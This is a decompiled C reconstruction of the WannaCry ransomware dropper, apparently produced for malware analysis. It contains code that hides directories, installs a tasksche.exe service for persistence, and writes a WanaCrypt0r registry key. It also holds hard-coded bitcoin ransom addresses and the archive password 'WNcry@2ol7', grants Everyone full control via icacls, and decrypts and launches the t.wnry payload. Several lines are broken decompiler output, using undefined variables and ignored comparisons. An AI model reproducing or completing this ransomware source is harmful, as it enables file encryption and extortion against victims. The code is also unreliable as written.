#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <windows.h>

uint FUN_00401000(void *param_1, int param_2) {
	FILE *_File;
	uint uVar1;
	size_t sVar2;
	char *_Mode;

	if (param_2 == 0) {
		_Mode = "wb";
	} else {
		_Mode = "rb";
	}

	_File = fopen("c.wnry",_Mode);

	if (_File == NULL) {
		uVar1 = 0;
	} else {
		if (param_2 == 0) {
			sVar2 = fwrite(param_1, 780, 1, _File);
		} else {
			sVar2 = fread(param_1, 780, 1, _File);
		}
		
		uVar1 = (uint)(sVar2 != 0);
		fclose(_File);
	}
	return uVar1;
}

int create_and_cwd_dir(LPCWSTR dir_1,LPCWSTR dir_2,wchar_t *dir_out) {
	BOOL BVar1;
	DWORD DVar2;

	CreateDirectoryW(dir_1,NULL);
	BVar1 = SetCurrentDirectoryW(dir_1);
	if (BVar1 != 0) {
		CreateDirectoryW(dir_2,NULL);

		// Set file/folder to hidden & system
		BVar1 = SetCurrentDirectoryW(dir_2);
		if (BVar1 != 0) {
			DVar2 = GetFileAttributesW(dir_2);
			SetFileAttributesW(dir_2,DVar2 | 6);
			if (dir_out != NULL) {
				swprintf(dir_out,"%s\\%s",dir_1,dir_2);
			}
			return 1;
		}
	}
	return 0;
}

uint create_and_cwd_random_hidden_directory(wchar_t *cwd_out) {
	DWORD pd_attr;
	wchar_t *pwVar1;
	int iVar2;
	undefined4 *puVar3;
	WCHAR programdata_path;
	undefined4 local_2d2 [129];
	WCHAR randomstring_w;
	undefined4 local_ca [49];

	puVar3 = (undefined4 *)&stack0xfffffb26;

	memset(puVar3, 0, 129);

	*(undefined2 *)puVar3 = 0;
	programdata_path = DAT_0040f874;
	puVar3 = local_2d2;

	memset(puVar3, 0, 129);

	*(undefined2 *)puVar3 = 0;
	randomstring_w = DAT_0040f874;
	puVar3 = local_ca;

	memset(puVar3, 0, 49);

	*(undefined2 *)puVar3 = 0;
	MultiByteToWideChar(0, 0, (LPCSTR)&randomstring, -1, &randomstring_w,99);

	// gets C:\ or C:\Windows
	GetWindowsDirectoryW((LPWSTR)&stack0xfffffb24,0x104);

	// C:\ProgramData or C:\Windows\ProgramData
	swprintf(&programdata_path,"%s\\ProgramData",&stack0xfffffb24);
	pd_attr = GetFileAttributesW(&programdata_path);

	if ((pd_attr == 0xffffffff) || (iVar2 = create_and_cwd_dir(&programdata_path,&randomstring_w,cwd_out), iVar2 == 0)) {

		// C:\Intel or C:\Windows\Intel
		swprintf(&programdata_path,"%s\\Intel",(wchar_t *)&stack0xfffffb24);
		iVar2 = create_and_cwd_dir(&programdata_path,&randomstring_w,cwd_out);

		if ((iVar2 == 0) && (iVar2 = create_and_cwd_dir((LPCWSTR)&stack0xfffffb24,&randomstring_w,cwd_out), iVar2 == 0 /*C:\*randomstring* */)) {
			GetTempPathW(0x104,&programdata_path);
			pwVar1 = wcsrchr(&programdata_path,L'\\');

			if (pwVar1 != NULL) {
				pwVar1 = wcsrchr(&programdata_path,L'\\');
				*pwVar1 = L'\0';
			}

			iVar2 = create_and_cwd_dir(&programdata_path,&randomstring_w,cwd_out);

			return (uint)(iVar2 != 0);
		}
	}

return 1;
}

undefined4 create_taskche_service(char *path_to_taskche) {
	undefined4 uVar1;
	SC_HANDLE hService;
	CHAR local_410 [1024];
	SC_HANDLE randomstring_service;
	undefined4 local_c;
	SC_HANDLE scmanager;

	local_c = 0;
	scmanager = OpenSCManagerA(NULL, NULL, 0xf003f);

	if (scmanager == NULL) {
		uVar1 = 0;
	} else {
		randomstring_service = OpenServiceA(scmanager,(LPCSTR)&randomstring,0xf01ff);

		if (randomstring_service == NULL) {

			sprintf(local_410, "cmd.exe /c \"%s", path_to_taskche);
			hService = CreateServiceA(scmanager, (LPCSTR)&randomstring, (LPCSTR)&randomstring, 0xf01ff, 0x10, 2, 1, local_410, NULL, NULL, NULL, NULL, NULL);
			uVar1 = local_c;
			
			if (hService != NULL) {
				StartServiceA(hService, 0, NULL);
				CloseServiceHandle(hService);
				local_c = 1;
				uVar1 = local_c;
			}

			} else {
				StartServiceA(randomstring_service, 0, NULL);
				CloseServiceHandle(randomstring_service);
				uVar1 = 1;
			}

			CloseServiceHandle(scmanager);
		}

	return uVar1;
}

undefined4 unzip_something(HMODULE param_1,char *param_2) {
	HRSRC hResInfo;
	HGLOBAL hResData;
	LPVOID pvVar1;
	DWORD DVar2;
	int *piVar3;
	int iVar4;
	int iVar5;
	undefined4 *puVar6;
	char *pcVar7;
	int local_130;
	undefined4 local_12c [74];

	hResInfo = FindResourceA(param_1, (LPCSTR)2058, "XIA");
	if (((hResInfo != NULL) && (hResData = LoadResource(param_1,hResInfo), hResData != NULL)) && (pvVar1 = LockResource(hResData), pvVar1 != NULL)) {
		DVar2 = SizeofResource(param_1,hResInfo);
		piVar3 = (int *)FUN_004075ad(pvVar1,DVar2,param_2);

		if (piVar3 != NULL) {
			local_130 = 0;
			iVar5 = 0x4a;
			puVar6 = local_12c;

			memset(puVar6, 0, 74);

			FUN_004075c4(piVar3,(char *)0xffffffff,&local_130);

			iVar5 = local_130;
			pcVar7 = (char *)0x0;

			if (0 < local_130) {
				do {
					FUN_004075c4(piVar3,pcVar7,&local_130);
					iVar4 = strcmp((char *)local_12c,"c.wnry");
					if ((iVar4 != 0) || (DVar2 = GetFileAttributesA((LPCSTR)local_12c), DVar2 == 0xffffffff)) {
						FUN_0040763d(piVar3,pcVar7,(char *)local_12c);
					}

					pcVar7 = pcVar7 + 1;
				} while ((int)pcVar7 < iVar5);
			}

			FUN_00407656(piVar3);
			return 1;
		}
	}

  return 0;
}

void bitcoin_something(void) {
	uint uVar1;
	int iVar2;
	undefined local_31c [178];
	char local_26a [602];
	char *bitcoin_addresses [3];

	bitcoin_addresses[0] = "13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94";
	bitcoin_addresses[1] = "12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw";
	bitcoin_addresses[2] = "115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn";
	
	uVar1 = FUN_00401000(local_31c,1);

	if (uVar1 != 0) {
		iVar2 = rand();
		strcpy(local_26a,local_10[iVar2 % 3]);
		FUN_00401000(local_31c,0);
	}

	return;
}

undefined4 acquire_taskche_mutex(int number_of_tries) {
	HANDLE hObject;
	int iVar1;
	char local_68 [100];

	sprintf(local_68,"%s%d","Global\\MsWinZonesCacheCounterMutexA",0);
	iVar1 = 0;

	// if mutex acquisition is successful return 1 
	if (0 < number_of_tries) {
		do {
			hObject = OpenMutexA(0x100000,1,local_68);
			if (hObject != NULL) {
				CloseHandle(hObject);
				return 1;
			}

			// sleep and try again
			Sleep(1000);
			iVar1 = iVar1 + 1;
		} while (iVar1 < number_of_tries);
	}

	// if mutex couldn't be acquired return 0
	return 0;
}

undefined4 create_or_start_taskche_service(void) {
	int iVar1;
	undefined4 *puVar2;
	char path_to_taskche;
	undefined4 local_20b;

	path_to_taskche = DAT_0040f910;
	puVar2 = &local_20b;

	memset(puVar2, 0, 129);

	*(undefined2 *)puVar2 = 0;
	*(undefined *)((int)puVar2 + 2) = 0;
	GetFullPathNameA("taskche.exe", 520, &path_to_taskche, NULL);

	iVar1 = create_taskche_service(&path_to_taskche);

	if ((iVar1 != 0) && (iVar1 = acquire_taskche_mutex(0x3c), iVar1 != 0)) {
		return 1;
	}

	iVar1 = run_command(&path_to_taskche, 0, NULL);

	if ((iVar1 != 0) && (iVar1 = acquire_taskche_mutex(0x3c), iVar1 != 0)) {
		return 1;
	}

	return 0;
}

int run_command(LPSTR param_1, DWORD param_2, LPDWORD param_3) {
	BOOL BVar1;
	DWORD DVar2;
	LPSTR *ppCVar4;
	int uVar5;
	_STARTUPINFOA local_58;
	_PROCESS_INFORMATION local_14;

	local_58.cb = 0x44;
	ppCVar4 = &local_58.lpReserved;

	memset(ppCVar4, 0, 16);

	local_14.hProcess = NULL;
	local_14.hThread = NULL;
	local_14.dwProcessId = 0;
	local_14.dwThreadId = 0;
	uVar5 = 1;
	local_58.wShowWindow = 0;
	local_58.dwFlags = 1;
	BVar1 = CreateProcessA(NULL, param_1, NULL, NULL, 0, 0x8000000, NULL, NULL, (LPSTARTUPINFOA)&local_58, (LPPROCESS_INFORMATION)&local_14);

	if (BVar1 == 0) {
		uVar5 = 0;
	} else {
		if (param_2 != 0) {
			DVar2 = WaitForSingleObject(local_14.hProcess,param_2);
		
			if (DVar2 != 0) {
				TerminateProcess(local_14.hProcess,0xffffffff);
			}
		
			if (param_3 != NULL) {
				GetExitCodeProcess(local_14.hProcess,param_3);
			}
		}
		CloseHandle(local_14.hProcess);
		CloseHandle(local_14.hThread);
	}
	return uVar5;
}

undefined4 set_or_query_registry_cwd(int set_registry) {
	size_t current_dir_length;
	LSTATUS LVar1;
	undefined4 *software_str;
	undefined4 *puVar3;
	bool bVar4;
	HKEY hKey;
	BYTE registry_value;
	undefined4 local_2df;
	undefined4 software_str_buf [10];
	undefined4 local_c4 [45];
	DWORD local_10;
	int i;
	HKEY regWanaHandle;

	software_str = "Software\\";

	strcpy(software_str_buf, software_str); // or memcpy(software_str_buf,software_str,5)

	registry_value = '\0';
	regWanaHandle = NULL;
	software_str = local_c4;

	memset(software_str, 0, 45);

	software_str = &local_2df;

	memset(software_str, 0, 129);

	*(undefined2 *)software_str = 0;
	*(undefined *)((int)software_str + 2) = 0;

	// Software\WanaCrypt0r
	wcscat((wchar_t *)software_str_buf,"WanaCrypt0r");

	i = 0;

	do {
		if (i == 0) {
			// HKEY_LOCAL_MACHINE
			hKey = (HKEY)0x80000002;
		} else {
			// HKEY_CURRENT_USER
			hKey = (HKEY)0x80000001;
		}

		RegCreateKeyW(hKey, (LPCWSTR)software_str_buf, (PHKEY)&regWanaHandle);

		if (regWanaHandle != NULL) {
			if (set_registry == 0) {
				local_10 = 0x207;
				LVar1 = RegQueryValueExA(regWanaHandle, "wd", NULL, NULL, &registry_value, &local_10);
				bVar4 = LVar1 == 0;

				if (bVar4) {
					SetCurrentDirectoryA((LPCSTR)&registry_value);
				}
			} else {
				GetCurrentDirectoryA(0x207,(LPSTR)&registry_value);
				current_dir_length = strlen((char *)&registry_value);
				LVar1 = RegSetValueExA(regWanaHandle, "wd", 0, 1, &registry_value, current_dir_length + 1);
				bVar4 = LVar1 == 0;
			}

			RegCloseKey(regWanaHandle);

			if (bVar4) {
				return 1;
			}
		}

		i = i + 1;

		if (1 < i) {
			return 0;
		}
	} while( true );
}

void randomstring_generator(char *randomstring_output) {
	size_t computername_len;
	int random_number2;
	int random_number;
	uint _Seed;
	int iVar1;
	undefined4 *puVar2;
	ushort *computername_ptr;
	int iVar3;
	ushort computername;
	undefined4 local_19a [99];
	DWORD computername_size;
	uint local_8;

	computername = DAT_0040f874;
	random_number = 99;
	computername_size = 399;
	puVar2 = local_19a;

	memset(puVar2, 0, random_number);

	*(undefined2 *)puVar2 = 0;
	GetComputerNameW((LPWSTR)&computername,&computername_size);
	local_8 = 0;
	_Seed = 1;
	computername_len = wcslen((wchar_t *)&computername);

	if (computername_len != 0) {
		computername_ptr = &computername;
		do {
			_Seed = _Seed * *computername_ptr;
			local_8 = local_8 + 1;
			computername_ptr = computername_ptr + 1;
			computername_len = wcslen((wchar_t *)&computername);
		} while (local_8 < computername_len);
	}

	srand(_Seed);
	random_number = rand();
	iVar3 = 0;
	iVar1 = random_number % 8 + 8;

	if (0 < iVar1) {
		do {
			random_number2 = rand();
			randomstring_output[iVar3] = (char)(random_number2 % 0x1a) + 'a';
			iVar3 = iVar3 + 1;
		} while (iVar3 < iVar1);
	}

	while (iVar3 < random_number % 8 + 0xb) {
		iVar1 = rand();
		randomstring_output[iVar3] = (char)(iVar1 % 10) + '0';
		iVar3 = iVar3 + 1;
	}

	randomstring_output[iVar3] = '\0';
	return;
}

int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PWSTR pCmdLine,int nCmdShow) {
	int *argc;
	char ***argv;
	uint uVar1;
	DWORD DVar2;
	short *psVar3;
	code *pcVar4;
	int arg1_cmp;
	undefined4 *puVar5;
	char *slash_i;
	undefined local_6e8 [1240];
	char filename [520];
	uint local_8;

	filename[0] = DAT_0040f910;
	arg1_cmp = 0x81;
	puVar5 = (undefined4 *)(filename + 1);

	memset(puVar5, 0, arg1_cmp);

	*(undefined2 *)puVar5 = 0;
	*(undefined *)((int)puVar5 + 2) = 0;
	GetModuleFileNameA(NULL, filename, 520);
	randomstring_generator((char *)&randomstring);

	argc = (int *)__p___argc();

	if (*argc == 2) {
		slash_i = "/i";
		argv = (char ***)__p___argv();

		strcmp(argv[i], "/i");

		if ((arg1_cmp == 0) && (uVar1 = create_and_cwd_random_hidden_directory((wchar_t *)0x0), uVar1 != 0)) {
			CopyFileA(filename, "tasksche.exe", 0);
			DVar2 = GetFileAttributesA("tasksche.exe");
			
			if ((DVar2 != 0xffffffff) && (arg1_cmp = create_or_start_taskche_service(), arg1_cmp != 0)) {
				return 0;
			}
		}
	}

	slash_i = strrchr(filename,0x5c);

	if (slash_i != NULL) {
		slash_i = strrchr(filename, 0x5c);
		*slash_i = '\0';
	}

	SetCurrentDirectoryA(filename);
	set_or_query_registry_cwd(1);
	FUN_00401dab(NULL, "WNcry@2ol7");
	bitcoin_something();
	run_command("attrib +h .", 0, NULL);
	run_command("icacls . /grant Everyone:F /T /C /Q", 0, NULL);
	arg1_cmp = FUN_0040170a();
	
	if (arg1_cmp != 0) {
		FUN_004012fd();
		arg1_cmp = FUN_00401437(local_6e8,NULL,0,0);
		if (arg1_cmp != 0) {
			local_8 = 0;
			psVar3 = (short *)FUN_004014a6(local_6e8,"t.wnry",&local_8);
			if (((psVar3 != NULL) && (argc = (int *)FUN_004021bd(psVar3,local_8), argc != NULL)) && (pcVar4 = (code *)FUN_00402924(argc,"TaskStart"), pcVar4 != NULL) {
				(*pcVar4)(0,0);
			}
		}
		FUN_0040137a();
	}
	return 0;
}

byte * __thiscall FUN_004014a6(void *this,LPCSTR param_1,uint *param_2) {
	byte *pbVar1;
	HANDLE hFile;
	int iVar2;
	byte *pbVar3;
	undefined4 *in_FS_OFFSET;
	size_t local_248;
	undefined4 local_244;
	undefined local_240;
	undefined4 local_23f;
	undefined2 uStack571;
	undefined uStack569;
	uint local_238;
	uint local_234;
	byte local_230 [512];
	size_t local_30;
	byte *local_2c;
	uint local_28;
	int local_24;
	uint local_20 [3];
	undefined4 local_14;
	undefined *puStack16;
	undefined *puStack12;
	undefined4 local_8;

	puStack12 = &DAT_004081e0;
	puStack16 = &DAT_004076f4;
	local_14 = *in_FS_OFFSET;
	*(undefined4 **)in_FS_OFFSET = &local_14;
	pbVar3 = (byte *)0x0;
	local_30 = 0;
	local_248 = 0;
	local_240 = 0;
	local_23f = 0;
	uStack571 = 0;
	uStack569 = 0;
	local_244 = 0;
	local_20[0] = 0;
	local_8 = 0;
	hFile = CreateFileA(param_1, 0x80000000, 1, NULL, 3, 0, NULL);
	if (hFile != (HANDLE)0xffffffff) {
		GetFileSizeEx(hFile,(PLARGE_INTEGER)&local_28);
		
		if ((local_24 < 1) && ((local_24 < 0 || (local_28 < 0x6400001)))) {
			iVar2 = (*_DAT_0040f880)(hFile,&local_240,8,local_20,0);
			
			if (iVar2 != 0) {
				iVar2 = memcmp(&local_240,"WANACRY!",8);
				
				if (iVar2 == 0) {
					iVar2 = (*_DAT_0040f880)(hFile,&local_248,4,local_20,0);
					
					if ((iVar2 != 0) && (local_248 == 0x100)) {
						iVar2 = (*_DAT_0040f880)(hFile,*(undefined4 *)((int)this + 0x4c8),0x100,local_20,0);
						
						if (iVar2 != 0) {
							iVar2 = (*_DAT_0040f880)(hFile,&local_244,4,local_20,0);
							
							if (iVar2 != 0) {
								iVar2 = (*_DAT_0040f880)(hFile,&local_238,8,local_20,0);
								
								if (((iVar2 != 0) && ((int)local_234 < 1)) && (((int)local_234 < 0 || (local_238 < 0x6400001)))) {
									iVar2 = FUN_004019e1((void *)((int)this + 4),*(void **)((int)this + 0x4c8),local_248,local_230,&local_30);
									
									if (iVar2 != 0) {
										FUN_00402a76((void *)((int)this + 0x54),local_230,(uint *)PTR_DAT_0040f578,local_30,(byte *)0x10);
										local_2c = (byte *)GlobalAlloc(0,local_238);
										
										if (local_2c != NULL) {
											iVar2 = (*_DAT_0040f880)(hFile,*(undefined4 *)((int)this + 0x4c8),local_28,local_20,0);
											pbVar1 = local_2c;
										
											if (((iVar2 != 0) && (local_20[0] != 0)) && ((0x7fffffff < local_234 ||	(((int)local_234 < 1 && (local_238 <= local_20[0])))))) {
												FUN_00403a77((void *)((int)this + 0x54),*(byte **)((int)this + 0x4c8),local_2c,local_20[0],1);
												*param_2 = local_238;
												pbVar3 = pbVar1;
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}
	}
	_local_unwind2(&local_14,0xffffffff);
	*in_FS_OFFSET = local_14;
	return pbVar3;
}